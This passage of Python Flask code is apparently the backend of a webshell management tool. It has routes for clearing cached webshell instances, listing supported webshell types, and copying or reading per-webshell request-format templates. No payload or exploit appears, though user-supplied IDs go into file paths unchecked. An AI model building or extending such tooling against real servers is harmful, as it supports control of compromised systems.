            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400

        removed = remove_webshell_instance_by_id(webshell_id)
        return jsonify({
            'status': 'success',
            'message': '缓存实例已清理' if removed else '未找到缓存实例或已被清理',
            'data': {
                'webshell_id': webshell_id,
                'removed': removed
            }
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'清理缓存失败: {str(e)}'
        }), 500


@core_management_bp.route('/getCacheStatus', methods=['GET'])
def get_cache_status():
    """获取缓存状态"""
    try:
        cache_status = get_webshell_cache_status()
        return jsonify({
            'status': 'success',
            'data': cache_status
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'获取缓存状态失败: {str(e)}'
        }), 500


@core_management_bp.route('/getSupportedTypes', methods=['GET'])
def get_supported_types():
    """获取支持的webshell类型"""
    try:
        supported_types = get_supported_webshell_types()
        return jsonify({
            'status': 'success',
            'data': {
                'supported_types': supported_types,
                'count': len(supported_types)
            }
        })
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'获取支持类型失败: {str(e)}'
        }), 500


@core_management_bp.route('/copyRequestFormatTemplate', methods=['POST'])
def copy_request_format_template():
    """复制请求格式模板文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        
        # 源模板文件路径
        source_file = os.path.join(DATA_DIR, 'request_format_define.json')
        
        # 目标文件路径
        target_filename = f"{webshell_id}_request_format_define.json"
        target_file = os.path.join(DATA_DIR, target_filename)
        
        # 检查源文件是否存在
        if not os.path.exists(source_file):
            return jsonify({
                'status': 'error', 
                'message': f'模板文件不存在: {source_file}'
            }), 404
        
        # 复制文件
        shutil.copy2(source_file, target_file)
        print(f"[*] 复制请求格式模板文件: {source_file} -> {target_file}")
        
        # 更新webshell配置中的requestFormatFile字段
        webshell_list = load_webshell_list()
        updated = False
        for webshell in webshell_list:
            if webshell['id'] == webshell_id:
                webshell['requestFormatFile'] = target_filename
                webshell['updated_at'] = int(time.time())
                updated = True
                print(f"[*] 更新webshell配置中的requestFormatFile: {target_filename}")
                break
        
        if updated:
            save_webshell_list(webshell_list)
        else:
            return jsonify({
                'status': 'error',
                'message': f'找不到指定的webshell: {webshell_id}'
            }), 404
        
        return jsonify({
            'status': 'success',
            'message': '请求格式模板文件创建成功',
            'data': {
                'webshell_id': webshell_id,
                'request_format_file': target_filename,
                'file_path': target_file
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'复制请求格式模板文件失败: {str(e)}'
        }), 500


@core_management_bp.route('/getDefaultRequestFormatTemplate', methods=['GET'])
def get_default_request_format_template():
    """获取默认请求格式模板"""
    try:
        # 默认请求格式模板文件路径
        template_file = os.path.join(DATA_DIR, 'request_format_define.json')
        
        if not os.path.exists(template_file):
            return jsonify({
                'status': 'error',
                'message': '默认模板文件不存在'
            }), 404
        
        # 读取模板文件
        with open(template_file, 'r', encoding='utf-8') as f:
            template_content = json.load(f)
        
        return jsonify({
            'status': 'success',
            'data': template_content
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'获取默认模板失败: {str(e)}'
        }), 500


@core_management_bp.route('/getRequestFormatContent', methods=['POST'])
def get_request_format_content():
    """获取请求格式内容"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        
        # 请求格式文件路径
        format_filename = f"{webshell_id}_request_format_define.json"
        format_file = os.path.join(DATA_DIR, format_filename)
        
        if not os.path.exists(format_file):
            return jsonify({
                'status': 'error',
                'message': '请求格式文件不存在'
            }), 404
        
        # 读取文件内容
        with open(format_file, 'r', encoding='utf-8') as f:
            file_content = f.read()
        
        return jsonify({
            'status': 'success',
            'data': {
                'webshell_id': webshell_id,
                'filename': format_filename,
                'content': file_content
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'获取请求格式内容失败: {str(e)}'
        }), 500
